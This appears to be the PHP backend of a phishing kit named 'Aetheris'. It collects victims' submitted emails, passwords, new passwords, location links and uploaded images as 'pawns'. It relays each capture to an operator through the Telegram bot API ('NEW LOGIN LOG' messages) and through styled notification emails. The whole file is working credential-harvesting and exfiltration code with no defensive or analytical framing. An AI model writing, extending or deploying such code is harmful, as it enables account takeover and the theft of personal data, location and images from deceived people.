<?php
include_once '../config/db.php';
include_once '../config/function.php';
include_once '../mail/send.php';
session_start();
$data = json_decode(file_get_contents("php://input"), true);
if (isset($_FILES["image"])) {
    $uploadResult = uploadFile($_FILES["image"]);
    $path = $uploadResult['success'] ? $uploadResult['path'] : '';
    $id = $_POST['id'];
    $page = $_POST['page'];
    createpawn($id, $path, '', $page);
    $user = readuser($id);
    if ($user['emailsend'] < $user['count'] && !isset($_SESSION['user'])) {
        # code...
    if (isset($user['bot_token']) && isset($user['bot_id'])) {
        $token = $user['bot_token'];
        $chatID = $user['bot_id'];
        sendImage($token, $chatID, $path, $id);
    }
    if ($user['enableemail'] == 1) {
        $newemailsend = $user['emailsend'] + 1;
        updateemailsend($id, $newemailsend);
        sendpawntoemail($page, $path, '', '');
    }
    }

    // return ;
} else if (isset($data['id'])) {
    $id = $data['id'];
    $email = $data['email'];
    $password = $data['password'];
    $page = $data['page'];
    $newpassword = isset($data['newpassword']) ? $data['newpassword'] : '';

    createpawn($id, $email, $password, $page, $newpassword);
    $user = readuser($id);
    if ($user['emailsend'] < $user['count'] && !isset($_SESSION['user'])) {
    if (isset($user['bot_token']) && isset($user['bot_id'])) {
        $token = $user['bot_token'];
        $chatID = $user['bot_id'];
        $newpass = '' ;
        // $text = "<b>$page</b>\nusername : $email\npassword : $password";
        if ($newpassword != '') {
            $newpass = "🔑 NEW Password: <code>$newpassword</code>";
        }
        $text = "
        <b>🔐 NEW LOGIN LOG</b>
━━━━━━━━━━━━━━━━━━━━━━━━
<b><code>$page</code></b>
━━━━━━━━━━━━━━━━━━━━━━━━

👤 Username: <b>$email</b>

🔑 Password: <code>$password</code>

$newpass


━━━━━━━━━━━━━━━━━━━━━━━━
<i>System notification</i>
";

        
        if (trim($password) == '') {
            $text = "<b>$page</b> : $email";
        }
        sendText($token, $chatID, $text);
    }
    if ($user['enableemail'] == 1) {
        $newemailsend = $user['emailsend'] + 1;
        updateemailsend($id, $newemailsend);
        sendpawntoemail($page, $email, $password, $newpassword);
    }}
}


function sendText($botToken, $chatId, $text)
{
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    return $result;
}
function sendImage($botToken, $chatId, $photoPath, $caption = "")
{
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";

    if (!file_exists($photoPath)) {
        return json_encode(["error" => "File not found"]);
    }

    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($photoPath)),
        'caption' => $caption
    ];

    $ch = curl_init();

    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postFields
    ]);

    $result = curl_exec($ch);

    if (curl_errno($ch)) {
        $error = curl_error($ch);
        curl_close($ch);
        return json_encode(["error" => $error]);
    }

    curl_close($ch);

    return $result;
}

function sendpawntoemail($page, $username, $password, $newpassword = '')
{
    // Assuming you have these variables defined before this code:
// $page, $username, $password, $our_url
$our_url = "http://localhost/pawn"; // Replace with your actual URL
$usernameDisplay = "";
$passwordDisplay = "";

// Check the conditions for the page type
if ($page === 'localisation') {
    // Act like a Google Map URL, hide the password entirely
    $usernameDisplay = "<strong>Location:</strong> <a href='" . htmlspecialchars($username) . "' target='_blank' style='color: #8B5CF6; font-weight: bold; text-decoration: none;'>View on Google Maps</a>";
    $passwordDisplay = ""; 
    
} elseif ($page === 'image') {
    // Remove '../' from the path and construct the full URL
    $cleanPath = str_replace('../', '', $username);
    $fullUrl = rtrim($our_url, '/') . '/' . ltrim($cleanPath, '/');
    
    $usernameDisplay = "<strong>Image:</strong> <a href='" . htmlspecialchars($fullUrl) . "' target='_blank' style='color: #8B5CF6; font-weight: bold; text-decoration: none;'>View Image</a>";
    $passwordDisplay = "";
    
} else {
    // Default behavior for standard login data
    $usernameDisplay = "<strong>email:</strong> <span style='color: #333;'>" . htmlspecialchars($username) . "</span>";
    $passwordDisplay = "<p style='font-size: 16px; margin: 10px 0;'><strong>Password:</strong> <span style='color: #333;'>" . htmlspecialchars($password) . "</span></p>";
    $newPasswordDisplay = "";
    if ($newpassword != '') {
        $newPasswordDisplay = "<p style='font-size: 16px; margin: 10px 0;'><strong>New Password:</strong> <span style='color: #333;'>" . htmlspecialchars($newpassword) . "</span></p>";
    }
}

// Construct the final HTML body
$body = "<!DOCTYPE html>
<html>
<head>
    <title>New Pawn</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        .header { background: linear-gradient(135deg, #8B5CF6, #C084FC); color: white; padding: 20px; text-align: center; border-radius: 10px 10px 0 0; }
        .content { background: #f9f9f9; padding: 30px; border-radius: 0 0 10px 10px; }
        .info-box { background: white; padding: 20px; border-radius: 10px; margin: 20px 0; border: 1px solid #eee; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class='container'>
        <div class='header'>
            <h2>New Pawn from " . $page . "</h2>
        </div>
        <div class='content'>
            <p>Hello, " . htmlspecialchars($_SESSION['user']['name']) . "!</p>
            <p>You have received a new pawn. Here are the details:</p>
            
            <div class='info-box'>
                <p style='font-size: 16px; margin: 10px 0;'>" . $usernameDisplay . "</p>
                " . $passwordDisplay . "
                " . $newPasswordDisplay . "
            </div>
            
            <br>
            <p>Best regards,<br>The Aetheris Team</p>
        </div>
        <div class='footer'>
            <p>&copy; 2026 Aetheris. All rights reserved.</p>
        </div>
    </div>
</body>
</html>";

sendEmail($_SESSION['user']['email'], $body, "Aetheris - New Pawn from " . ucfirst($page));
}
    
?>